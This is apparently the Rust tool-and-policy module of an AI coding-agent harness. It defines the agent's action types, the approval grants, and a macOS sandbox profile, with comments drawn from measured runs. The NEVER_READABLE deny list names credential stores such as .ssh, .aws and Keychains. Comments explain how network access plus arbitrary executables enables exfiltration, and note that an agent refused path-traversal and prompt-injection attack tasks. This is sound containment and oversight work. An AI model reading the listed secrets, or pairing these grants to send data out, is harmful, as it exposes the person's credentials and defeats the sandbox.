//! Typed, bounded workspace tools and policy enforcement.
pub mod atomic;
pub mod document;
pub mod service;
pub mod site;

use pwr_domain::hash_bytes;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::{
    io::{Read as _, Seek as _},
    path::{Component, Path, PathBuf},
    time::Duration,
};
use tokio::{process::Command, time::timeout};

/// macOS process-isolation wrapper.
const SEATBELT: &str = "/usr/bin/sandbox-exec";
/// Scratch directory given to child processes, inside the workspace root.
pub const SCRATCH_DIRECTORY: &str = ".pwr-scratch";

/// Where the harness keeps a workspace's state, artifacts and configuration.
pub const STATE_DIRECTORY: &str = ".pwr";

#[derive(Debug, thiserror::Error)]
pub enum ToolError {
    #[error("policy denied: {0}")]
    Denied(String),
    #[error("tool I/O failure: {0}")]
    Io(#[from] std::io::Error),
    #[error("tool timed out")]
    Timeout,
    /// A command stopped at the policy's time limit, with the end of what it
    /// had printed: a bare "timed out" does not say where it was stuck.
    #[error("{0}")]
    CommandTimedOut(String),
}
/// What `search` returns when its call names no bound.
pub const DEFAULT_SEARCH_MATCHES: usize = 30;

fn default_search_matches() -> usize {
    DEFAULT_SEARCH_MATCHES
}

/// Entries `list_tree` returns when the caller names no bound.
const DEFAULT_TREE_ENTRIES: usize = 200;

fn default_tree_entries() -> usize {
    DEFAULT_TREE_ENTRIES
}

#[derive(Debug, Clone, Serialize, Deserialize)]
#[serde(tag = "capability", rename_all = "snake_case")]
pub enum ActionProposal {
    Complete {
        rationale: String,
    },
    /// The task should not be performed, and here is why.
    ///
    /// Measured: on the attack tasks the deployment recognised a path-traversal
    /// exfiltration and a prompt injection, refused both, and said so in prose
    /// -- because prose was the only thing left. Nineteen capabilities and none
    /// of them expressed a refusal. The loop then counted each refusal as a
    /// malformed call, spent it from the malformed budget, and on the third one
    /// killed the run for "repeatedly malformed tool calls".
    ///
    /// So the harness punished correct behaviour three ways and reported it as
    /// a broken action channel. A refusal is a terminal outcome the deployment
    /// is entitled to reach, and it is not a completion: the work was not done,
    /// and saying it was would be the lie the verification rules exist to
    /// prevent.
    Decline {
        rationale: String,
    },
    /// Something worth remembering across conversations, proposed to the
    /// person. Conversations only; nothing is written until they confirm it
    /// (`pwr_orchestrator::personal`).
    Remember {
        text: String,
        /// `workspace` for this project, `global` for the person; the
        /// workspace when omitted.
        #[serde(default)]
        scope: Option<String>,
    },
    /// What PWR knows about a workspace it worked in before, by name, from
    /// that workspace's wiki (`pwr_orchestrator::wiki`); every known project
    /// when the name is empty. Reads the wiki only. Conversations only.
    RecallProject {
        #[serde(default)]
        name: Option<String>,
    },
    /// A question to a workspace's knowledge graph (`pwr_orchestrator::graph`):
    /// a file, folder, symbol or package and its neighbours. This workspace,
    /// or a known project by name. Conversations only.
    WikiQuery {
        query: String,
        #[serde(default)]
        project: Option<String>,
    },
    /// A screenshot of a page on this machine -- a local server's URL or an
    /// HTML file in the workspace -- shown to a model that reads images
    /// (`look_at`). Conversations with such a model only.
    LookAt {
        target: String,
        #[serde(default)]
        width: Option<u32>,
        #[serde(default)]
        height: Option<u32>,
        /// What to do on the page before it is looked at: click, type,
        /// press a key ([`PageStep`]).
        #[serde(default)]
        steps: Vec<PageStep>,
    },
    /// What a page on this machine shows as text and what it logged: its
    /// HTTP status, title, visible text and console messages -- `look_at`
    /// without the image, for a model that does not read images.
    CheckPage {
        target: String,
        /// As for `look_at`.
        #[serde(default)]
        steps: Vec<PageStep>,
    },
    /// The recent output of the person's own terminal tabs in the app,
    /// read-only: what their dev server, build or tests printed. Answered by
    /// the client, after the person allows it (`TerminalRead`).
    ReadTerminal {
        #[serde(default)]
        lines: Option<usize>,
    },
    /// Several replacements in one file, under one hash guard.
    ///
    /// Named for the schema, not for the variant. The tool has always been
    /// offered to deployments as `apply_patch`, while this tag said
    /// `apply_patch_hunks`, so a deployment that called the tool it was given
    /// was told the name did not exist -- and three such calls in a row end a
    /// run for a broken action channel. Measured on the ornith-1.5:35b run of
    /// 2026-09-06: four consecutive `apply_patch` calls, the run killed at
    /// 1,218 seconds with a complete and working site in the workspace. The
    /// alias keeps event logs written under the old tag readable.
    #[serde(rename = "apply_patch", alias = "apply_patch_hunks")]
    ApplyPatchHunks {
        path: String,
        expected_hash: String,
        hunks: Vec<Hunk>,
    },
    /// Starts a long-running service and waits until it accepts a connection.
    StartService {
        executable: String,
        #[serde(default)]
        args: Vec<String>,
        /// Where to wait for it. Omit and one is reserved and reported back.
        #[serde(default)]
        port: Option<u16>,
        #[serde(default)]
        ready_timeout_secs: Option<u64>,
    },
    /// Stops a service this run started and returns what it printed.
    StopService {
        id: u32,
    },
    /// Creates a directory and its parents.
    MakeDirectory {
        path: String,
    },
    /// Removes a file, guarded by its hash, or a directory it is told to
    /// remove whole.
    DeletePath {
        path: String,
        #[serde(default)]
        expected_hash: Option<String>,
        #[serde(default)]
        recursive: bool,
    },
    /// Puts a file back as it was when the run first read or changed it.
    RestoreFile {
        path: String,
    },
    /// Moves or renames within the workspace.
    MovePath {
        from: String,
        to: String,
    },
    /// What version control says has changed, structurally.
    VcsStatus {},
    /// The working tree's diff against HEAD, optionally narrowed.
    VcsDiff {
        #[serde(default)]
        paths: Vec<String>,
    },
    /// Offers a command as the deterministic check for this workspace.
    ///
    /// Runs nothing by itself. If a person approves it, it joins the checks the
    /// run verifies against and its executable joins the allowlist; if not, the
    /// workspace still has no verifier and completion is still refused.
    ProposeVerifier {
        executable: String,
        #[serde(default)]
        args: Vec<String>,
        rationale: String,
    },
    ReadFile {
        path: String,
        #[serde(default)]
        first_line: Option<usize>,
        #[serde(default)]
        max_lines: Option<usize>,
    },
    /// Recovers a document's text into a text file beside it.
    ///
    /// The other half of refusing to read a PDF as text. A refusal alone leaves
    /// the document out of reach, and in the campaign that measured this the
    /// document *was* the task: without it the run had nothing to work from and
    /// spent its budget proving that. The extraction is written to a file
    /// rather than returned whole, so the text is read in windows like any
    /// other file, survives a compaction, and carries a header saying where it
    /// came from -- a run that later quotes the CV can be checked against it.
    ExtractDocument {
        path: String,
    },
    Search {
        query: String,
        /// The harness's bound when omitted, as it already is for
        /// `find_definition`. A cap on results is not something a deployment
        /// can answer for better than the harness, and requiring it cost turns:
        /// across the R2 pilot traces of 2026-09-14/15, 107 `search` calls sent
        /// a query and a glob without it and were refused as malformed.
        #[serde(default = "default_search_matches")]
        max_matches: usize,
        /// Read `query` as a regular expression instead of as literal text.
        ///
        /// Defaulted, so a call written against the schema as it stood before
        /// this parameter existed still means what it meant then. That is the
        /// whole reason it is a parameter and not a second tool: the catalogue
        /// a small deployment has to choose from does not grow.
        #[serde(default)]
        regex: bool,
        /// Restrict the walk to matching paths, in gitignore glob syntax with
        /// its sense inverted -- a bare glob includes, a leading `!` excludes.
        #[serde(default)]
        path_glob: Option<String>,
        /// Search the project's installed dependencies instead of its own
        /// files: `node_modules`, a virtual environment's `site-packages`, the
        /// cargo registry's unpacked sources for what `Cargo.lock` pins.
        ///
        /// A parameter rather than a second tool, for the reason `regex` is:
        /// the catalogue a small deployment chooses from does not grow.
        #[serde(default)]
        in_dependencies: bool,
    },
    /// Where a name is declared, rather than everywhere it is mentioned.
    ///
    /// The one capability here that a literal search cannot stand in for.
    /// Finding a declaration by hand means knowing which keyword the language
    /// uses -- `def running_min` in Python, `fn` in Rust, `func` in Go -- so a
    /// caller that guesses wrong learns nothing and pays a turn for it.
    /// Measured on `external-running-min-stability`: every trial opened with a
    /// search for the declaration and then spent a second turn reading around
    /// what it found.
    FindDefinition {
        name: String,
        #[serde(default)]
        path_glob: Option<String>,
        #[serde(default)]
        max_matches: Option<usize>,
    },
    ListTree {
        /// The harness's bound when omitted, as for `search`: a model asked
        /// for a subtree sent only `path`, and was refused for the missing
        /// number (backlog C.24, Qwen3.6, 2026-09-22).
        #[serde(default = "default_tree_entries")]
        max_entries: usize,
        /// A directory to list instead of the whole workspace.
        #[serde(default)]
        path: Option<String>,
    },
    ApplyReplace {
        path: String,
        expected_hash: String,
        replacement: String,
    },
    WriteFile {
        path: String,
        content: String,
    },
    ReplaceText {
        path: String,
        expected_hash: String,
        find: String,
        replace: String,
    },
    RunCommand {
        executable: String,
        args: Vec<String>,
        /// Text to write to the command's standard input.
        ///
        /// A command is executed directly rather than through a shell, so
        /// there is no pipe and no redirection: `args` are arguments, never
        /// syntax. That is deliberate -- it is what stops an argument being
        /// reinterpreted as a command -- but it left no way at all to feed a
        /// program its input. Measured: a run that had downloaded a Go
        /// toolchain, built a correct program and then could not test it,
        /// because every attempt to pipe into it was flattened into arguments.
        #[serde(default)]
        stdin: Option<String>,
        /// Workspace-relative directory to run in, instead of the root.
        ///
        /// Without it the only way to build a project in a subdirectory was a
        /// shell's `cd sub && npm run build`, which there is no shell to run.
        /// Measured on 2026-09-21: a goal-mode session sent exactly that
        /// seventy times; `/usr/bin/cd` exists on macOS, ran, changed nothing
        /// and exited 0, so the build it was meant to precede never happened
        /// and every attempt looked like a success.
        #[serde(default)]
        cwd: Option<String>,
        /// Run outside the sandbox, with the person's full rights. Asked
        /// about every time it is not already granted (`OutsideSandbox`):
        /// the way forward when the sandbox, not the project, is what stops a
        /// command -- a toolchain writing where the boundary does not reach.
        #[serde(default, skip_serializing_if = "std::ops::Not::not")]
        outside_sandbox: bool,
    },
    FetchUrl {
        url: String,
        /// Where in the workspace to write the body instead of returning it:
        /// an archive, a binary, anything too large to read whole.
        #[serde(default, skip_serializing_if = "Option::is_none")]
        save_as: Option<String>,
    },
    /// Marks a plan step finished.
    ///
    /// The deployment says which step it has finished; the harness never infers
    /// it. Inferring would mean the harness deciding the task had progressed,
    /// which is the harness doing the work and would make the measurement
    /// meaningless. This performs nothing in the workspace -- it records a
    /// claim, and the claim is judged against the checks like any other.
    RecordProgress {
        step: usize,
        #[serde(default)]
        note: Option<String>,
    },
}
impl ActionProposal {
    pub fn validate(&self) -> Result<(), ToolError> {
        match self {
            Self::Decline { rationale } if rationale.trim().is_empty() => {
                // A refusal without a reason is indistinguishable from a
                // deployment giving up, and the two need different answers.
                Err(ToolError::Denied(
                    "decline requires a rationale saying why the task should not be performed"
                        .into(),
                ))
            }
            Self::Complete { rationale } if rationale.is_empty() => {
                Err(ToolError::Denied("completion rationale is required".into()))
            }
            Self::Remember { text, .. } if text.trim().is_empty() => Err(ToolError::Denied(
                "remember needs the fact to remember, in one short sentence".into(),
            )),
            Self::Remember {
                scope: Some(scope), ..
            } if !matches!(scope.as_str(), "workspace" | "global") => Err(ToolError::Denied(
                "remember's scope is `workspace` (this project) or `global` (the person)".into(),
            )),
            Self::ProposeVerifier {
                executable,
                rationale,
                ..
            } => {
                if executable.trim().is_empty() || rationale.trim().is_empty() {
                    return Err(ToolError::Denied(
                        "a proposed verifier needs an executable and a rationale a person can judge"
                            .into(),
                    ));
                }
                // The same shape refused for run_command: a program name never
                // contains whitespace, and one that does reaches exec as a
                // single filename.
                if executable.split_whitespace().count() > 1 {
                    return Err(ToolError::Denied(format!(
                        "`{executable}` is a command line where a program name belongs; pass the program in `executable` and the rest in `args`"
                    )));
                }
                Ok(())
            }
            Self::ReadFile { path, .. }
            | Self::ExtractDocument { path }
            | Self::ApplyReplace { path, .. }
            | Self::WriteFile { path, .. }
            | Self::ReplaceText { path, .. }
            | Self::RestoreFile { path }
                if path.is_empty() =>
            {
                Err(ToolError::Denied("action path is empty".into()))
            }
            Self::Search {
                query, max_matches, ..
            } if query.is_empty() || *max_matches == 0 => Err(ToolError::Denied(
                "search query and limit are required".into(),
            )),
            Self::FindDefinition { name, .. } if name.trim().is_empty() => {
                Err(ToolError::Denied("name is required".into()))
            }
            Self::FindDefinition {
                max_matches: Some(0),
                ..
            } => Err(ToolError::Denied(
                "max_matches must be greater than zero".into(),
            )),
            Self::ListTree { max_entries, .. } if *max_entries == 0 => {
                Err(ToolError::Denied("tree limit is required".into()))
            }
            Self::ReadFile {
                max_lines: Some(0), ..
            } => Err(ToolError::Denied(
                "max_lines must be greater than zero".into(),
            )),
            Self::ReplaceText { find, .. } if find.is_empty() => {
                Err(ToolError::Denied("find text is required".into()))
            }
            Self::LookAt { target, .. } if target.trim().is_empty() => Err(ToolError::Denied(
                "look_at needs a target: a local server's URL or an HTML file's path".into(),
            )),
            Self::CheckPage { target, .. } if target.trim().is_empty() => Err(ToolError::Denied(
                "check_page needs a target: a local server's URL or an HTML file's path".into(),
            )),
            Self::FetchUrl { url, .. } if url.is_empty() => {
                Err(ToolError::Denied("url is required".into()))
            }
            Self::RunCommand { executable, .. } if executable.is_empty() => {
                Err(ToolError::Denied("executable is required".into()))
            }
            _ => Ok(()),
        }
    }
}
/// Process-level isolation for command execution.
///
/// The boundary is recorded on every result rather than assumed: a run that
/// could not be sandboxed must be visibly unsandboxed, never silently so.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum SandboxPolicy {
    /// Refuse to run a command at all when no sandbox is available.
    Required,
    /// Sandbox where the platform supports it. Where it does not, **refuse**,
    /// unless the person opted out with `PWR_ALLOW_UNCONFINED=1`, and then
    /// record that the command ran unconfined.
    ///
    /// It ran unconfined silently until 2026-09-23: an external review found
    /// that every platform but macOS -- the only one with an adapter -- ran the
    /// model's commands with the person's full rights and said so nowhere a
    /// person would look (backlog R.3).
    Preferred,
    Disabled,
    /// Full access, chosen by the person for a workspace: no sandbox, and the
    /// person's own environment -- the real HOME with its caches and
    /// credentials, the system's temporary directory -- so a command behaves
    /// exactly as it would in their terminal. Unlike `Disabled`, which only
    /// the harness's own tests use and which keeps the hermetic environment,
    /// this is a boundary lifted on purpose, and the audit says so
    /// (`sandboxed: false`).
    FullAccess,
}

/// Actions whose effects reach past the workspace, and which a user must
/// authorise explicitly. Denial is the default; a grant is never inferred.
#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, PartialOrd, Ord)]
#[serde(rename_all = "snake_case")]
pub enum Approval {
    /// Editing a dependency manifest or lockfile.
    DependencyChange,
    /// Adopting a command the agent proposed as this workspace's verifier.
    ///
    /// A repository that declares no checks cannot complete, which is correct
    /// and leaves no way forward: the two toolchain-provisioning runs wrote
    /// correct programs into workspaces created from nothing and are failures
    /// under that rule. The way out cannot be the agent running whatever it
    /// nominates -- a command nobody authorised is not a verifier, and one the
    /// agent both chooses and trusts is the agent marking its own work. So it
    /// proposes and a person decides.
    VerifierProposal,
    /// Rewriting version-control history.
    HistoryRewrite,
    /// Publishing a package or pushing to a remote.
    Publish,
    /// Reaching the network at all, for the workspace and for any process it
    /// runs. Dependency resolution needs it; so does exfiltration.
    NetworkAccess,
    /// Binding and connecting to services on this machine, and nothing beyond
    /// it.
    ///
    /// Verifying a system rather than a file means starting a service and
    /// exercising it, which needs to reach a local port. It is separate from
    /// `NetworkAccess` because it is a genuinely smaller grant -- no remote
    /// host is reachable, so nothing can be exfiltrated -- and a genuinely
    /// real one: it reaches whatever else listens on this machine, the model
    /// backend among it. Neither implies the other, and the audit records
    /// which was given.
    ///
    /// The boundary is this *host*, not the loopback interface. seatbelt takes
    /// only `*` or `localhost` as the host in a network address, and its
    /// `localhost` covers every address the machine holds, so a service on a
    /// LAN interface is in scope too. That is the platform's limit rather than
    /// an intent, and it is stated here because the narrower reading would be
    /// wrong.
    LocalService,
    /// Running any executable, so a run can fetch and install the toolchain a
    /// task needs -- a JDK, a Go distribution, a Flutter SDK -- rather than
    /// failing because the host happens not to have it.
    ///
    /// This is the widest grant PWR has, and what makes it defensible is
    /// where the installs land rather than what they are. A child process
    /// already runs with `HOME` and `TMPDIR` inside the workspace, and the
    /// sandbox already confines writes there, so a toolchain installed under
    /// this grant is installed *into the workspace*: the host is not modified,
    /// nothing persists into the next run, and deleting the workspace undoes
    /// it. That is a better arrangement than installing to the host even
    /// setting safety aside.
    ///
    /// What it does not do is make a run safe to combine with
    /// `NetworkAccess` and leave unattended. The sandbox denies writing
    /// outside the workspace; it does not deny *reading* outside it. An
    /// arbitrary executable plus the network is the shape of an exfiltration,
    /// and that is a property of the pair rather than of either alone. The
    /// sensitive parts of the host home directory are denied to any sandboxed
    /// run (see `sandbox_profile`), which narrows it but does not close it.
    ToolchainInstall,
    /// Driving the machine's container engine -- Docker, Podman -- through
    /// its socket.
    ///
    /// The one grant that leaves the sandbox rather than widening it. The
    /// command stays confined, but what it asks the daemon for is not: a
    /// container reaches the network, and a bind mount reaches any path the
    /// engine shares, which on Docker Desktop is the whole home directory.
    /// A containerised task cannot be built or tested without it, so it
    /// exists; it is asked about in `Ask` mode whatever Settings say (see
    /// `effective_ask_before` in the CLI), and the question says what it
    /// gives away.
    ContainerEngine,
    /// Running one command outside the sandbox, with the person's full rights,
    /// when the sandbox rather than the project is what stops it. Asked in
    /// every mode that sandboxes, whatever Settings say: it is the boundary
    /// itself, lifted for a command.
    OutsideSandbox,
    /// Reading, writing or running in a folder outside the workspace --
    /// its parent, a sibling project -- with PWR's own file tools. Granted
    /// in Full access, asked about with the exact path otherwise.
    /// Subfolders are the workspace and need nothing.
    OutsideWorkspace,
    /// Reading the recent output of the person's own terminal tabs in the
    /// app. Never granted by a mode: the terminal is the person's shell, with
    /// whatever it printed -- their own commands, paths, sometimes secrets --
    /// so it is asked about once per conversation, in Full access too.
    TerminalRead,
}

/// Host paths under the real home directory that no run has a reason to read.
///
/// Denied to every sandboxed run. `HOME` is redirected into the workspace, so
/// a tool looking for its own configuration finds the workspace copy; these are
/// the absolute paths that would go around that.
const NEVER_READABLE: [&str; 9] = [
    ".ssh",
    ".aws",
    ".gnupg",
    ".config/gh",
    ".config/gcloud",
    ".kube",
    ".docker/config.json",
    ".netrc",
    "Library/Keychains",
];

/// System paths a process needs to exist at all.
///
/// A sandbox that denies reading everything outside the workspace also denies
/// the dynamic linker its cache and the shell its binaries, and nothing starts.
/// This is the floor: enough to load and run a program, and no user data.
const SYSTEM_READABLE: [&str; 10] = [
    // The root directory itself: without it nothing resolves a path and no
    // process starts at all. Measured -- `/usr/bin/true` aborts without it.
    "/",
    "/usr",
    "/bin",
    "/sbin",
    "/System",
    "/Library",
    "/private/var/db",
    // `xcode-select` reads its developer directory link from here, and git
    // refuses to run without it.
    "/private/var/select",
    "/private/etc",
    "/dev",
];

/// Where toolchains live outside the workspace.
///
/// The command allowlist is derived from the repository, and what it names is
/// usually installed in the user's home -- cargo, rustup, pyenv, nvm. Denying
/// the home wholesale would deny the agent the compiler it was told to use, so
/// these subpaths are readable and the rest of the home is not. A toolchain
/// PWR installed itself lives inside the workspace and needs no entry.
const TOOLCHAIN_READABLE: [&str; 10] = [
    ".cargo", ".rustup", ".local", ".pyenv", ".nvm", ".sdkman", ".gradle", ".m2", "go", ".bun",
];

/// Toolchain roots outside the home, by convention on this platform.
const TOOLCHAIN_PREFIXES: [&str; 3] = ["/opt/homebrew", "/opt/local", "/Applications/Xcode.app"];

/// Where a workspace keeps the toolchains the host does not have. Each
/// directory in it contributes its `bin` (or a macOS JDK's `Contents/Home/bin`)
/// to the front of PATH, for the run's commands and for its checks alike, so a
/// Go or a JDK downloaded into the workspace is the `go` or `javac` a declared
/// check runs.
pub const TOOLCHAINS_DIRECTORY: &str = ".toolchains";

/// Paths outside the workspace a toolchain's runtime writes to whatever its
/// environment says.
///
/// .NET keeps the shared memory of its named mutexes under `/tmp/.dotnet`, not
/// `TMPDIR`. With `HOME` in the workspace every run is a first run to it, and
/// the first thing it does -- NuGet's migrations -- takes such a mutex.
/// Measured 2026-09-26: every `dotnet` command in the sandbox died in 100 ms
/// with EPERM on `/tmp/.dotnet/shm`, so a C# project could not even build.
/// Newer .NET SDKs also create `/tmp/.dotnet.XXXXXX` directories before the
/// mutex exists. Their narrowly named temporary paths are allowed below.
const RUNTIME_WRITABLE: [&str; 2] = ["/private/tmp/.dotnet", BROWSER_SCRATCH];

/// What one stream of a command keeps: the first and last 8 KiB, where the
/// first error and the summary are, with the middle elided and counted.
///
/// Measured on stack matrix c1 (2026-09-26): 6 of 321 commands wrote more than
/// 16 KiB and those six were half of every byte of command output -- five of
/// them `unzip` naming each file it extracted -- at up to 64 KiB a stream,
/// some 16k tokens, into a local model's window. Commands only: a file read,
/// written or patched is bounded by the policy's own limit.
pub const COMMAND_STREAM_BYTES: usize = 16 * 1024;

/// Programs whose toolchain writes to macOS's per-user temporary directory
/// whatever `TMPDIR` says.
const APPLE_TOOLCHAIN_PROGRAMS: [&str; 3] = ["swift", "xcodebuild", "xcrun"];

/// macOS's per-user temporary directory (`confstr(_CS_DARWIN_USER_TEMP_DIR)`,
/// `/private/var/folders/.../T`), canonical, looked up once.
///
/// Apple's toolchain uses it whatever the environment says. Measured
/// 2026-09-27 (stack matrix c2, swift-lru): in the sandbox, `swift test` could
/// never run -- xcrun's cache, Foundation's atomic saves (`TemporaryItems`) and
/// Swift Build's `swbuild.tmp.*` are all made there, and each was refused, so
/// a Swift task could not check a line of its own work in 34 attempts.
fn darwin_user_temp_dir() -> Option<&'static Path> {
    static DIRECTORY: std::sync::OnceLock<Option<PathBuf>> = std::sync::OnceLock::new();
    DIRECTORY
        .get_or_init(|| {
            let output = std::process::Command::new("/usr/bin/getconf")
                .arg("DARWIN_USER_TEMP_DIR")
                .output()
                .ok()?;
            let path = PathBuf::from(String::from_utf8(output.stdout).ok()?.trim());
            path.canonicalize()
                .ok()
                .filter(|path| path.starts_with("/private/var/folders"))
        })
        .as_deref()
}

/// A command's arguments for running inside PWR's sandbox.
///
/// SwiftPM runs `Package.swift` and plugins inside a sandbox of its own, and a
/// process in PWR's cannot apply another: measured 2026-09-27, every sandboxed
/// `swift test` died on `sandbox_apply: Operation not permitted`. PWR's
/// sandbox confines the same process more tightly than SwiftPM's would, so
/// SwiftPM is told not to add its own.
fn without_nested_sandbox(executable: &str, args: &[String]) -> Vec<String> {
    let mut args = args.to_vec();
    let subcommand = args.first().map(String::as_str);
    if program_name(executable) == "swift"
        && matches!(subcommand, Some("build" | "test" | "run" | "package"))
        && !args.iter().any(|arg| arg == "--disable-sandbox")
    {
        args.insert(1, "--disable-sandbox".to_owned());
    }
    args
}

/// Where `look_at`'s browser keeps its temporary files, sockets among them.
///
/// Outside the workspace because a Unix socket's path may be no longer than
/// 104 bytes on macOS, and Chromium's instance lock is a socket under its
/// temporary directory: under a workspace's `.pwr-scratch` it was either too
/// long or, where it fit, the bind was refused, and the browser gave up.
/// Sockets are allowed here and nowhere else.
pub const BROWSER_SCRATCH: &str = "/private/tmp/pwr-look";
/// Where MSBuild puts its build nodes' sockets, whatever TMPDIR says.
const MSBUILD_NODE_SOCKET: &str = "^/private/tmp/MSBuild[0-9]+$";

/// Programs a run is told the machine has or lacks, so a model does not guess:
/// asked to use Go on a Mac without it, one downloaded the linux-amd64 build.
const PROBED_PROGRAMS: &[&str] = &[
    "python3",
    "pip3",
    "uv",
    "node",
    "npm",
    "pnpm",
    "yarn",
    "bun",
    "deno",
    "java",
    "javac",
    "mvn",
    "gradle",
    "kotlinc",
    "dotnet",
    "go",
    "cargo",
    "rustc",
    "gcc",
    "g++",
    "clang",
    "clang++",
    "cmake",
    "make",
    "ninja",
    "swift",
    "ruby",
    "bundle",
    "php",
    "composer",
    "elixir",
    "mix",
    "dart",
    "flutter",
    "docker",
    "git",
    "sqlite3",
    "psql",
    "mysql",
    "mongosh",
    "redis-server",
    "terraform",
    "kubectl",
];

/// Output that says a command wanted the network and the sandbox refused it.
/// Strong signs only: a false positive costs one question, a false negative a
/// task that cannot restore its packages.
const NETWORK_DENIED_SIGNS: &[&str] = &[
    "Unable to load the service index",
    "NU1301",
    "Could not resolve host",
    "Couldn't resolve host",
    "getaddrinfo ENOTFOUND",
    "getaddrinfo EAI_AGAIN",
    "Temporary failure in name resolution",
    "nodename nor servname provided",
    "Name or service not known",
    "Network is unreachable",
    "Failed to establish a new connection",
    "Could not fetch URL",
    "dial tcp: lookup",
    "Could not transfer artifact",
    "UnknownHostException",
    "Could not GET",
    "npm ERR! network",
    "npm error network",
    "code ENOTFOUND",
    "code EAI_AGAIN",
    "unable to access 'http",
    "error sending request for url",
    "failed to download from",
    // Composer, Bundler, pub, Hex.
    "curl error 6",
    "Could not fetch specs from",
    "Got socket error trying to find package",
    ":failed_connect",
];

/// Whether a command's output says the network was wanted and refused.
pub fn looks_like_network_denied(output: &str) -> bool {
    NETWORK_DENIED_SIGNS
        .iter()
        .any(|sign| output.contains(sign))
}

/// Whether a command fetches dependencies: what a package manager does
/// before anything else, and what it keeps retrying, sometimes for minutes,
/// when the network is withheld.
pub fn fetches_dependencies(executable: &str, args: &[String]) -> bool {
    let args = args_after_program(executable, args).unwrap_or(args);
    let first = args.first().map(String::as_str).unwrap_or_default();
    let second = args.get(1).map(String::as_str).unwrap_or_default();
    match program_name(executable).as_str() {
        "npm" | "pnpm" | "yarn" | "bun" => {
            first.is_empty()
                || matches!(first, "install" | "i" | "ci" | "add" | "update" | "upgrade")
        }
        "pip" | "pip3" | "uv" | "poetry" | "pipenv" => {
            matches!(first, "install" | "sync" | "add" | "lock" | "update")
        }
        "cargo" => matches!(
            first,
            "build" | "test" | "run" | "check" | "fetch" | "update" | "install" | "add"
        ),
        "go" => {
            matches!(first, "build" | "test" | "run" | "get" | "install")
                || (first == "mod" && matches!(second, "download" | "tidy"))
        }
        "mvn" | "mvnw" | "gradle" | "gradlew" => true,
        "composer" => matches!(first, "install" | "update" | "require"),
        "bundle" => first.is_empty() || first == "install",
        "gem" => first == "install",
        "mix" => matches!(first, "deps.get" | "test" | "compile"),
        "dart" | "flutter" => first == "pub" && matches!(second, "get" | "upgrade"),
        "dotnet" => matches!(first, "restore" | "build" | "test" | "run"),
        "swift" => {
            matches!(first, "build" | "test" | "run")
                || (first == "package" && matches!(second, "resolve" | "update"))
        }
        _ => false,
    }
}

/// Programs whose work is done by a container engine's daemon.
const CONTAINER_CLIENTS: &[&str] = &[
    "docker",
    "docker-compose",
    "podman",
    "podman-compose",
    "nerdctl",
    "kind",
    "k3d",
    "act",
    "devcontainer",
];

/// What a command says when a container engine was wanted and the sandbox kept
/// it from the socket -- `docker` itself, and the libraries that drive it from
/// a test run, Testcontainers above all.
const CONTAINER_DENIED_SIGNS: &[&str] = &[
    "Cannot connect to the Docker daemon",
    "permission denied while trying to connect to the docker API",
    "permission denied while trying to connect to the Docker daemon",
    "Could not find a valid Docker environment",
    "Error while fetching server API version",
    "Cannot connect to Podman",
];

/// Whether a command's output says it wanted a container engine and could not
/// reach one.
pub fn looks_like_container_engine_denied(output: &str) -> bool {
    CONTAINER_DENIED_SIGNS
        .iter()
        .any(|sign| output.contains(sign))
}

/// Whether `executable` is a container engine's client.
pub fn is_container_client(executable: &str) -> bool {
    let name = Path::new(executable)
        .file_name()
        .map(|name| name.to_string_lossy().into_owned())
        .unwrap_or_else(|| executable.to_owned());
    CONTAINER_CLIENTS.contains(&name.as_str())
}

/// The container engine's socket on this machine, resolved to the file it
/// is -- seatbelt matches the path a connection reaches, not a symlink to it.
///
/// `DOCKER_HOST` first, then where Docker Desktop, OrbStack, Colima and
/// Rancher Desktop put theirs, then the conventional path, which on a Mac is
/// usually a link to one of those.
///
/// Where an engine would be, not whether one is running: the socket file
/// stays on disk when Docker Desktop quits. It is what the sandbox grant opens,
/// so it answers "which socket"; a caller that needs a live daemon asks it.
pub fn container_socket() -> Option<PathBuf> {
    let mut candidates = Vec::new();
    if let Ok(host) = std::env::var("DOCKER_HOST")
        && let Some(path) = host.strip_prefix("unix://")
    {
        candidates.push(PathBuf::from(path));
    }
    if let Some(home) = std::env::var_os("HOME").map(PathBuf::from) {
        for relative in [
            ".docker/run/docker.sock",
            ".orbstack/run/docker.sock",
            ".colima/default/docker.sock",
            ".colima/docker.sock",
            ".rd/docker.sock",
        ] {
            candidates.push(home.join(relative));
        }
    }
    candidates.push(PathBuf::from("/var/run/docker.sock"));
    candidates
        .into_iter()
        .filter(|path| path.exists())
        .find_map(|path| path.canonicalize().ok())
}

/// Where the host's container client is installed, when that is somewhere the
/// sandbox does not already let a command read.
///
/// Docker Desktop's `docker` is a link into `/Applications/Docker.app`, and so
/// are its `buildx` and `compose` plugins: without this the client cannot
/// even be loaded. The directory two levels up from the resolved binary holds
/// both (`Contents/Resources/bin/docker`, `Contents/Resources/cli-plugins`).
fn container_client_home() -> Option<PathBuf> {
    let host = std::env::var_os("PATH")?;
    std::env::split_paths(&host)
        .map(|directory| directory.join("docker"))
        .find(|candidate| candidate.is_file())
        .and_then(|candidate| candidate.canonicalize().ok())
        .and_then(|binary| binary.parent()?.parent().map(Path::to_path_buf))
}

/// The `bin` directories of the toolchains installed in the workspace, in the
/// order they go on PATH.
pub fn toolchain_paths(root: &Path) -> Vec<PathBuf> {
    let Ok(entries) = std::fs::read_dir(root.join(TOOLCHAINS_DIRECTORY)) else {
        return Vec::new();
    };
    let mut directories: Vec<PathBuf> = entries
        .flatten()
        .map(|entry| entry.path())
        .filter(|path| path.is_dir())
        .collect();
    directories.sort();
    let mut paths = Vec::new();
    for directory in directories {
        if directory.file_name().is_some_and(|name| name == "bin") {
            paths.push(directory);
            continue;
        }
        // An npm package unpacked here is not a toolchain: its `bin` holds
        // scripts that find their runtime relative to an installation they
        // are not in. Seen 2026-10-07: a model extracted npm's own tarball
        // (it unpacks as `package/`) and from then on every `npm` in the
        // workspace was that one, failing with a module not found, in front
        // of the working npm of the machine.
        if directory.join("package.json").is_file() {
            continue;
        }
        // A distribution with its executable at the top, as dotnet-install
        // leaves one.
        if has_executable(&directory) {
            paths.push(directory.clone());
        }
        paths.extend(shallowest_bin(&directory));
    }
    paths
}

/// How deep under a toolchain its `bin` is looked for: `go/bin` is one level,
/// a macOS JDK's `Contents/Home/bin` three, CMake's
/// `CMake.app/Contents/bin` three under the directory it was unpacked into.
